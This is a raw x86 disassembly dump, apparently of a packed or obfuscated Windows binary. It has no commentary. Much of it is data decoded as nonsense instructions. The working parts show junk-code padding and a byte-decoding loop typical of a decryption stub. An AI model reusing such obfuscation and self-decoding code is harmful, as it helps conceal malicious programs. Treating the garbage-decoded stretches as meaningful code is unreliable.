  4164a2:	and    dh,BYTE PTR [ecx+0x13960f41]
  4164a8:	jle    0x41646c
  4164aa:	(bad)  [ebx-0x2870a0a]
  4164b0:	lahf   
  4164b1:	push   cs
  4164b2:	add    eax,0xd274c791
  4164b7:	fcom   st(2)
  4164b9:	aaa    
  4164ba:	test   eax,0xe487c25f
  4164bf:	enter  0x7e41,0x4a
  4164c3:	push   cs
  4164c4:	scas   al,BYTE PTR es:[edi]
  4164c5:	mov    esp,0xdef3db76
  4164ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164cb:	mov    dl,0xbb
  4164cd:	out    dx,al
  4164ce:	sbb    ecx,edx
  4164d0:	mov    esp,0xdf4214f8
  4164d5:	clc    
  4164d6:	cwde   
  4164d7:	retf   0xd4f7
  4164da:	fdivr  DWORD PTR [ebx]
  4164dc:	cmp    edx,0xfffffff5
  4164df:	mov    DWORD PTR [esi+ebp*2-0x4],0x3d8bc847
  4164e7:	sbb    eax,0xb13cb57a
  4164ec:	xor    al,0x4f
  4164ee:	daa    
  4164ef:	in     eax,dx
  4164f0:	xchg   ecx,eax
  4164f1:	aad    0x68
  4164f3:	movq   mm1,QWORD PTR [ecx]
  4164f6:	mov    edx,0xbae291c4
  4164fb:	fidivr WORD PTR [esi-0x5a]
  4164fe:	(bad)  
  4164ff:	xor    ch,BYTE PTR [edi]
  416501:	mov    dh,BYTE PTR [esi+0x275b8b44]
  416507:	add    DWORD PTR [ebx-0x2],eax
  41650a:	adc    DWORD PTR [di],ecx
  41650d:	sti    
  41650e:	test   eax,0xccf300d5
  416513:	jnp    0x416550
  416515:	fs leave 
  416517:	push   ecx
  416518:	in     al,dx
  416519:	mov    edi,0x2114aafe
  41651e:	mov    cl,0x9b
  416520:	xchg   esp,eax
  416521:	jl     0x41654c
  416523:	xlat   BYTE PTR ds:[ebx]
  416524:	mov    al,ds:0xd66e0af5
  416529:	mov    ds:0x4530f6d,eax
  41652e:	xchg   esi,eax
  41652f:	shl    BYTE PTR [ebp+0x77716a43],1
  416535:	cmp    al,0x85
  416537:	or     al,0x3c
  416539:	pop    ss
  41653a:	inc    edx
  41653b:	cli    
  41653c:	rcr    DWORD PTR [edi],1
  41653e:	dec    ecx
  41653f:	xlat   BYTE PTR ds:[ebx]
  416540:	dec    edx
  416541:	(bad)  
  416542:	ins    BYTE PTR es:[edi],dx
  416543:	fnsave [esi+eax*1]
  416546:	call   0xc543:0xf8e800ef
  41654d:	lods   al,BYTE PTR ds:[esi]
  41654e:	test   al,0xde
  416550:	mov    ecx,0x667c3295
  416555:	dec    esi
  416556:	repz out 0x23,eax
  416559:	push   ebp
  41655a:	mov    edx,0x3333e39b
  41655f:	mov    ecx,0xc80b02e8
  416565:	push   ecx
  416566:	lea    eax,[ebp-0x2c]
  416569:	push   eax
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x422588
  416605:	mov    edi,0x4224ce
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x422588
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp+0x4e01d70]
  416729:	push   0x77
  41672b:	cld    
  41672c:	push   ss
  41672d:	sbb    BYTE PTR [ebx+0x6f181814],bl
  416733:	cmp    al,cl
  416735:	sub    BYTE PTR [ebx-0x51],ah
  416738:	dec    eax
  416739:	test   DWORD PTR [edi+0x68],ecx
  41673c:	int3   
  41673d:	test   DWORD PTR [edx+0x484646fb],esi
  416743:	mov    ch,BYTE PTR [edx-0x817facd]
  416749:	in     al,0xb5
  41674b:	or     esi,DWORD PTR [eax]
  41674d:	aad    0x34
  41674f:	mov    ds:0xd68f8e1c,eax
  416754:	dec    esi
  416755:	ins    BYTE PTR es:[edi],dx
  416756:	push   ds
  416757:	xchg   ecx,eax
  416758:	pop    ax
  41675a:	hlt    
  41675b:	fcomp  DWORD PTR [edx+0x11]
  41675e:	mov    al,0x3e
  416760:	icebp  
  416761:	shl    BYTE PTR [esi-0x1e1299d0],cl
  416767:	cwde   
  416768:	jle    0x416706
  41676a:	aam    0x10
  41676c:	repnz push ss
  41676e:	(bad)  
  41676f:	es inc eax
  416771:	adc    eax,0x4b3fabae
  416776:	mov    bh,0xa6
  416778:	pop    ds
  416779:	enter  0xab62,0x88
  41677d:	sbb    al,0x8f
  41677f:	add    eax,DWORD PTR [esi]
  416781:	jno    0x41678a
  416783:	ror    DWORD PTR [esi+0x5b],0xb3
  416787:	ds add cl,bh
  41678a:	adc    eax,0x822187d3
  41678f:	inc    ebx
  416790:	popa   
  416791:	call   0xc5ad0d8
  416796:	popf   
  416797:	inc    esi
  416798:	shr    BYTE PTR [eax+0x3aa96fcf],0xd2
  41679f:	or     edi,edi
  4167a1:	mov    dl,0xdb
  4167a3:	aam    0x13
  4167a5:	xor    esp,ebp
  4167a7:	in     al,dx
  4167a8:	js     0x4167a0
  4167aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167ab:	mov    ebp,0xf1ffd172
  4167b0:	inc    eax
  4167b1:	and    ch,cl
  4167b3:	xchg   ebp,eax
  4167b4:	mov    ecx,0xbffa9b11
  4167b9:	inc    ebp
  4167ba:	retf   0x3d72
  4167bd:	jmp    0xbb32:0x87930664
  4167c4:	shr    edx,1
  4167c6:	sub    BYTE PTR [edi-0x2d],ch
  4167c9:	mov    ds:0xf258eee2,eax
  4167ce:	cli    
  4167cf:	or     dh,BYTE PTR [ebx+0x7]
  4167d2:	out    dx,eax
  4167d3:	in     al,0x85
  4167d5:	sbb    esi,esp
  4167d7:	sbb    ecx,DWORD PTR [edx-0x61f02b86]
  4167dd:	(bad)  
  4167de:	hlt    
  4167df:	or     ah,ah
  4167e1:	cmp    ebp,DWORD PTR [ebx+0x5981c115]
  4167e7:	adc    al,0xfe
  4167e9:	adc    dl,bl
  4167eb:	into   
  4167ec:	push   ds
  4167ed:	jp     0x4167e9
  4167ef:	mov    ds:0x45f101da,al
  4167f4:	inc    ecx
  4167f5:	jbe    0x416870
  4167f7:	jb     0x416795
  4167f9:	imul   edx,DWORD PTR [edi-0x1b],0x28
  4167fd:	pop    eax
  4167fe:	ds retf 
  416800:	daa    
  416801:	adc    ecx,DWORD PTR [ecx+0x10]
  416804:	ss adc dh,cl
  416807:	arpl   WORD PTR [ecx],si
  416809:	push   0xcd54672c
  41680e:	lahf   
  41680f:	aaa    
  416810:	pop    edx
  416811:	mov    eax,0x4bba0ecf
  416816:	mov    ecx,DWORD PTR [edi+0x5]
  416819:	sub    edx,DWORD PTR [edi-0x1025bcd9]
  41681f:	sub    DWORD PTR [edi-0x1e],ebx
  416822:	pop    ecx
  416823:	mov    edi,0xa2e2d03c
  416828:	sar    DWORD PTR [ecx+0x10],1
  41682b:	mov    dl,0xda
  41682d:	jmp    0x6db6:0x7c79931e
  416834:	xchg   ecx,eax
  416835:	cmp    esp,DWORD PTR [ecx+0x43]
  416838:	out    0xe2,eax
  41683a:	jmp    0x6916:0x8ede4ad2
  416841:	shr    cl,0x3d
  416844:	hlt    
  416845:	cmp    eax,0xe3e95d71
  41684a:	gs adc bl,dl
  41684d:	dec    eax
  41684e:	sub    edx,esp
  416850:	mov    cl,BYTE PTR [edx+0x3514c13c]
  416856:	(bad)  
  416857:	cld    
  416858:	add    eax,0xaf489bed
  41685d:	sub    dh,ah
  41685f:	pushf  
  416860:	add    ch,cl
  416862:	scas   eax,DWORD PTR es:[edi]
  416863:	(bad)  
  416864:	inc    edx
  416865:	lock jmp 0x416848
  416868:	sbb    ecx,ebp
  41686a:	cmp    dl,BYTE PTR [edi]
  41686c:	push   edx
  41686d:	data16 mov dl,0x54
  416870:	xchg   DWORD PTR [ebp+0x3c3bf198],edi
  416876:	sti    
  416877:	mov    al,0xb8
  416879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41687b:	(bad)  
  41687c:	or     DWORD PTR [ecx+0x314836f4],ebx
  416882:	push   esi
  416883:	int    0xa8
  416885:	leave  
  416886:	inc    edx
  416887:	daa    
  416888:	dec    dh
  41688a:	call   0xda8c:0x6ab7f0e5
  416891:	adc    esi,ecx
  416893:	mov    ebx,0xdd2066
  416898:	pop    ebx
  416899:	push   edx
  41689a:	gs xchg ecx,eax
  41689c:	xor    al,BYTE PTR [esi]
  41689e:	out    dx,al
  41689f:	jno    0x4168d8
  4168a1:	nop
  4168a2:	mov    dl,0x2b
  4168a4:	int    0x6
  4168a6:	cmp    ah,BYTE PTR [ecx]
  4168a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168a9:	scas   al,BYTE PTR es:[edi]
  4168aa:	xor    DWORD PTR [esi-0x52],ebx
  4168ad:	dec    esp
  4168ae:	outs   dx,BYTE PTR ds:[esi]
  4168af:	scas   eax,DWORD PTR es:[edi]
  4168b0:	xor    DWORD PTR [ebp-0x49d08a5e],esi
  4168b6:	leave  
  4168b7:	shl    DWORD PTR [esi],0xde
  4168ba:	jl     0x416937
  4168bc:	adc    bh,BYTE PTR [edx]
  4168be:	fdiv   DWORD PTR [ebp-0x4de04a6f]
  4168c4:	out    dx,eax
  4168c5:	pop    eax
  4168c6:	jle    0x41684a
  4168c8:	popf   
  4168c9:	mov    esp,DWORD PTR [ebx+edx*1]
  4168cc:	addr16 mov esi,0xa17146ca
  4168d2:	sub    eax,ebx
  4168d4:	push   edi
  4168d5:	sti    
  4168d6:	arpl   di,di
  4168d8:	lea    edi,[edx+0x1f]
  4168db:	jno    0x416895
  4168dd:	addr16 mov ds,WORD PTR [bx-0x2f6]
  4168e3:	push   esi
  4168e4:	cmp    ebx,esi
  4168e6:	push   0x7636321c
  4168eb:	fxch   st(5)
  4168ed:	pop    ds
  4168ee:	sbb    BYTE PTR [ecx],dl
  4168f0:	push   ebp
  4168f1:	sbb    esi,DWORD PTR [eax]
  4168f3:	and    al,0x7e
  4168f5:	in     al,0x7f
  4168f7:	adc    BYTE PTR [ecx-0x54c7f6a6],al
  4168fd:	jmp    0xe8b63486
  416902:	arpl   WORD PTR [ecx+0x378f3f8f],sp
  416908:	jmp    0x2e72054e
  41690d:	sub    ch,0xce
  416910:	jae    0x41695f
  416912:	mov    esp,0xb48d897d
  416917:	sub    BYTE PTR [edx+0x10],dh
  41691a:	add    DWORD PTR [esi-0x68a40f55],0x7a
  416921:	push   esi
  416922:	test   al,0x7e
  416924:	imul   BYTE PTR [ebx+0x7e]
  416927:	fild   DWORD PTR [edi]
  416929:	mov    ah,0x72
  41692b:	xor    DWORD PTR [ebx-0x756bdeae],esp
  416931:	or     ah,BYTE PTR [eax]
  416933:	mov    ?,WORD PTR [edi]
  416935:	clc    
  416936:	jno    0x41694e
  416938:	add    ebp,0x41
  41693b:	sti    
  41693c:	inc    esp
  41693d:	out    dx,eax
  41693e:	xchg   edi,eax
  41693f:	xchg   ebx,eax
  416940:	je     0x416911
  416942:	test   ah,cl
  416944:	mov    ch,BYTE PTR [edi]
  416946:	cwde   
  416947:	aam    0xfa
  416949:	jno    0x416960
  41694b:	retfw  
  41694d:	ret    
  41694e:	inc    ecx
  41694f:	pop    edx
  416951:	sub    eax,0x311e4920
  416956:	and    DWORD PTR [edx-0x389e91b3],eax
  41695c:	leave  
  41695d:	and    esp,DWORD PTR [esi-0x4c]
  416960:	adc    al,0x55
  416962:	mov    dh,0x90
  416964:	cld    
  416965:	sti    
  416966:	fadd   DWORD PTR [edx]
  416968:	add    eax,0xb55297b5
  41696d:	dec    edx
  41696e:	hlt    
  41696f:	push   ebx
  416970:	adc    ebx,DWORD PTR [edi]
  416972:	mov    edx,0x458d5faf
  416977:	(bad)  
  416978:	push   eax
  416979:	mov    eax,DWORD PTR [ebp+0x10]
  41697c:	mov    ecx,DWORD PTR [ebp+0x14]
  41697f:	shrd   eax,ecx,0x2
  416983:	shr    ecx,0x2
  416986:	mov    ecx,DWORD PTR [ebp+0x10]
  416989:	mov    edx,DWORD PTR [ebp+0x14]
  41698c:	xor    eax,esi
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0x7cc5570d
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx-0x51e7e7ec],bl
  4169ac:	jmp    0x3674a6b
  4169b1:	mov    cl,BYTE PTR [eax]
  4169b3:	sub    DWORD PTR [ecx+0x6830ae17],ebp
  4169b9:	pop    esp
  4169ba:	test   eax,0xf2b5ef07
  4169bf:	or     dl,ch
  4169c1:	addr16 inc ebp
  4169c3:	push   ds
  4169c4:	in     eax,0x2a
  4169c6:	mov    edx,0x104d6a76
  4169cb:	jnp    0x41695b
  4169cd:	or     BYTE PTR [edx],0xc7
  4169d0:	or     edi,ecx
  4169d2:	jecxz  0x416a4a
  4169d4:	xchg   ebp,eax
  4169d5:	cwde   
  4169d6:	popf   
  4169d7:	cdq    
  4169d8:	sbb    DWORD PTR [esi-0x37964f22],ebp
  4169de:	rol    BYTE PTR [eax+0x6e321f0],1
  4169e4:	(bad)  
  4169e5:	aaa    
  4169e6:	outs   dx,BYTE PTR ds:[esi]
  4169e7:	jle    0x416a53
  4169e9:	xlat   BYTE PTR ds:[ebx]
  4169ea:	xor    al,0xe
  4169ec:	cmp    al,0x6b
  4169ee:	cs and eax,0xd40bfbb0
  4169f4:	pop    eax
  4169f5:	add    BYTE PTR [ebx+edx*2+0x36cbd5b5],al
  4169fc:	repz cmc 
  4169fe:	or     al,0x2c
  416a00:	adc    DWORD PTR [edx-0x55],ecx
  416a03:	ss push esi
  416a05:	fnstenv [edi+0x7b52b30f]
  416a0b:	inc    eax
  416a0c:	mov    eax,ds:0xb37101ad
  416a11:	mov    ?,edi
  416a13:	or     eax,0x228a769
  416a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a19:	pop    ebx
  416a1a:	int    0x45
  416a1c:	pop    ecx
  416a1d:	jne    0x416a2f
  416a1f:	leave  
  416a20:	inc    edx
  416a21:	adc    al,0x19
  416a23:	sbb    al,0xc1
  416a25:	xchg   edx,eax
  416a26:	inc    ecx
  416a27:	add    eax,0x1400d55f
  416a2c:	mov    ebp,0x915634cd
  416a31:	fs popa 
  416a33:	mov    ds,WORD PTR [edi+0x17]
  416a36:	sub    al,0x49
  416a38:	shl    BYTE PTR [ebx+0x4cf17d7c],1
  416a3e:	mov    eax,0x28b38239
  416a43:	psubw  mm5,QWORD PTR [eax-0x2cfc5a14]
  416a4a:	outs   dx,DWORD PTR ds:[esi]
  416a4b:	cmp    eax,0x5980d728
  416a50:	mov    al,0x3f
  416a52:	mov    ebx,0xcf5a3875
  416a57:	mov    WORD PTR [esi-0xc],gs
  416a5a:	push   eax
  416a5b:	xor    ch,ah
  416a5d:	pop    esp
  416a5e:	shl    BYTE PTR [eax+0x30a88a9e],1
  416a64:	int    0x31
  416a66:	jl     0x416a90
  416a68:	loop   0x416a2a
  416a6a:	repnz mov ebx,es
  416a6d:	dec    esi
  416a6e:	dec    esi
  416a6f:	add    bh,al
  416a71:	iret   
  416a72:	and    eax,0xfaa3dd2d
  416a77:	lock push cs
  416a79:	or     eax,0xf5daed84
  416a7e:	arpl   dx,bx
  416a80:	add    bl,BYTE PTR [ebp-0x1d057ce3]
  416a86:	or     dh,cl
  416a88:	(bad)  
  416a8a:	cld    
  416a8b:	xchg   edi,eax
  416a8c:	push   edx
  416a8d:	(bad)  
  416a8e:	fisttp DWORD PTR [edi+0x67c1460c]
  416a94:	adc    dh,BYTE PTR [ebp-0x2a]
  416a97:	inc    esi
  416a98:	mov    ds:0x98166e08,eax
  416a9d:	adc    eax,0x6acbcfcd
  416aa2:	int    0xc9
  416aa4:	push   cs
  416aa5:	inc    ecx
  416aa6:	inc    eax
  416aa7:	inc    edx
  416aa8:	and    DWORD PTR [eax-0x5ba5f77f],edx
  416aae:	fcom   st(0)
  416ab0:	mov    edx,0xfb1ff0d1
  416ab5:	push   ebx
  416ab6:	cmp    ebx,DWORD PTR [ebx]
  416ab8:	add    al,0x67
  416aba:	nop
  416abb:	stc    
  416abc:	int    0xc4
  416abe:	mov    dh,0xf2
  416ac0:	jle    0x416a78
  416ac2:	push   cs
  416ac3:	cmp    DWORD PTR [ecx-0x1fee256d],esi
  416ac9:	hlt    
  416aca:	aas    
  416acb:	inc    eax
  416acc:	lods   al,BYTE PTR ds:[esi]
  416acd:	mov    WORD PTR [ebx],ds
  416acf:	out    dx,eax
  416ad0:	push   ss
  416ad1:	push   0xd360db4f
  416ad6:	pop    es
  416ad7:	sbb    DWORD PTR [eax-0x21],0x6ab85824
  416ade:	fistp  WORD PTR [ebx+0x508da178]
  416ae4:	nop
  416ae5:	nop    edx
  416ae8:	test   bh,cl
  416aea:	shr    BYTE PTR [eax+0x7],0x1c
  416aee:	mov    es,WORD PTR ds:0xc5c6ffb0
  416af4:	pop    es
  416af5:	nop
  416af6:	inc    eax
  416af7:	lock adc BYTE PTR [edx-0x68],0x92
  416afc:	adc    DWORD PTR [eax-0x65a8bf85],ebx
  416b02:	(bad)  [edx-0x42]
  416b05:	xchg   edi,eax
  416b06:	daa    
  416b07:	sub    al,0xb8
  416b09:	nop
  416b0a:	scas   eax,DWORD PTR es:[edi]
  416b0b:	call   0x9124:0xe940b467
  416b12:	jae    0x416b21
  416b14:	xor    BYTE PTR [edi],ah
  416b16:	icebp  
  416b17:	(bad)  
  416b18:	call   0x8fafd1ac
  416b1d:	mov    bl,0x77
  416b1f:	fs int 0xcd
  416b22:	mov    edi,0xbf1b79ad
  416b27:	mov    edi,0x7b95ea2b
  416b2c:	test   bh,dh
  416b2e:	out    dx,eax
  416b2f:	mov    eax,ds:0x1a029f36
  416b34:	outs   dx,DWORD PTR ds:[esi]
  416b35:	xchg   ebp,eax
  416b36:	in     eax,dx
  416b37:	mov    eax,ds:0x2dd052be
  416b3c:	(bad)  
  416b3e:	pushf  
  416b3f:	std    
  416b40:	loopne 0x416b26
  416b42:	ret    
  416b43:	neg    BYTE PTR [edi*4+0x1587e5cc]
  416b4a:	sub    eax,0xcb17b4a2
  416b4f:	leave  
  416b50:	ins    BYTE PTR es:[edi],dx
  416b51:	add    sp,0xb462
  416b56:	stos   DWORD PTR es:[edi],eax
  416b57:	std    
  416b58:	pushf  
  416b59:	inc    esp
  416b5a:	fist   DWORD PTR [ecx]
  416b5c:	adc    al,0xb0
  416b5e:	pop    ebp
  416b5f:	in     al,dx
  416b60:	lahf   
  416b61:	mov    ?,WORD PTR [edx+edi*1+0x73e273fc]
  416b68:	pop    ss
  416b69:	in     eax,dx
  416b6a:	push   edi
  416b6b:	ds (bad) 
  416b6e:	jmp    0x416ba1
  416b70:	mov    dl,0xe2
  416b72:	lea    esi,[ebx-0x6f]
  416b75:	outs   dx,BYTE PTR ds:[esi]
  416b76:	xor    BYTE PTR [edx],cl
  416b78:	test   BYTE PTR [ebx],cl
  416b7a:	adc    BYTE PTR [edi],dl
  416b7c:	and    ebx,DWORD PTR [ecx+0x54]
  416b7f:	pop    eax
  416b80:	mov    BYTE PTR [ebp-0x4d],bl
  416b83:	push   cs
  416b84:	jecxz  0x416b2d
  416b86:	repz xchg edx,eax
  416b88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b89:	sub    cl,BYTE PTR [edi+edx*4]
  416b8c:	icebp  
  416b8d:	xlat   BYTE PTR ds:[ebx]
  416b8e:	jns    0x416c05
  416b90:	inc    ebp
  416b91:	repz rcr BYTE PTR [ebx],cl
  416b94:	jmp    0x15d:0x42eec34d
  416b9b:	push   ds
  416b9c:	jle    0x416b25
  416b9e:	add    ch,BYTE PTR [ebx-0x58b4e942]
  416ba4:	(bad)  
  416ba5:	jmp    0x9b7f:0xe17e9098
  416bac:	mov    ds:0x13d34878,al
  416bb1:	mov    BYTE PTR [edi-0x23],dh
  416bb4:	sti    
  416bb5:	mov    dl,0xe3
  416bb7:	cmp    edx,DWORD PTR [edx+0x462faf05]
  416bbd:	xlat   BYTE PTR ds:[ebx]
  416bbe:	jne    0x416b7d
  416bc0:	leave  
  416bc1:	xor    DWORD PTR [esi],eax
  416bc3:	adc    edx,DWORD PTR [ecx]
  416bc5:	inc    ebx
  416bc6:	mov    dh,0x20
  416bc8:	bound  ebp,QWORD PTR [ebx-0x2de16d6]
  416bce:	add    al,0x63
  416bd0:	adc    edx,DWORD PTR [ecx+0x5a74db16]
  416bd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bd7:	mov    ds,WORD PTR [eax+0x4bf4684e]
  416bdd:	gs sub al,0xf4
  416be0:	retf   0xa36
  416be3:	icebp  
  416be4:	push   esi
  416be5:	call   0x2209:0xd6250b32
  416bec:	aam    0x6c
  416bee:	xor    edx,edx
  416bf0:	or     eax,edx
  416bf2:	add    eax,edi
  416bf4:	push   eax
  416bf5:	shl    ecx,0x1e
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x42824f,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x42837b,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x42822b,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x4282a3,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x428303,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x4281eb
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x42822f,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
